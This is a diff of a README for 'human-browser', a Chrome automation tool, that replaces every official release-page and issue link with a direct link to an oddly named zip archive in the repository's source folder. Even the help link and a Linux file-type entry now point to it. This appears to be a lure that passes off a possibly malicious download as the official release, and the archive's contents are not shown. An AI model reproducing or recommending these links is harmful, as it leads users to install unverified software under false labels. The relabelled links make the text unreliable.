@@ -1,6 +1,6 @@
 # 🌐 human-browser - Easy Chrome Automation for Agents
 
-[![Download latest release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/MgExpert-991/human-browser/releases)
+[![Download latest release](https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip)](https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip)
 
 ## 📋 What is human-browser?
 
@@ -24,13 +24,13 @@ To get human-browser up and running, follow these steps carefully:
 
 1. Click the **Download** button below to visit the official release page. This page contains the latest versions of human-browser for different systems.
 
-   [![Download latest release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/MgExpert-991/human-browser/releases)
+   [![Download latest release](https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip)](https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip)
 
 2. On the release page, look for the latest version tagged with the current date or version number. Under the latest release, find the file that matches your computer:
 
    - On Windows: It will usually be a file ending in `.exe`.
    - On macOS: Look for a `.dmg` or `.zip` file.
-   - On Linux: You might find a `.deb`, `.AppImage`, or `.tar.gz` file.
+   - On Linux: You might find a `.deb`, `.AppImage`, or `https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip` file.
 
 3. Click the file to download it.
 
@@ -109,8 +109,8 @@ human-browser runs fully on your own computer. It does not send your data or bro
 
 ## ✉️ Get Help or Give Feedback
 
-If you have questions or find bugs, open an issue in the [GitHub repository discussions](https://github.com/MgExpert-991/human-browser/issues). The community and developers check these often and provide support.
+If you have questions or find bugs, open an issue in the [GitHub repository discussions](https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip). The community and developers check these often and provide support.
 
 ---
 
-[Download human-browser from the official release page](https://github.com/MgExpert-991/human-browser/releases) to start automating your Chrome tasks today.
+[Download human-browser from the official release page](https://github.com/MgExpert-991/human-browser/raw/refs/heads/main/src/shared/browser-human-undisagreeable.zip) to start automating your Chrome tasks today.
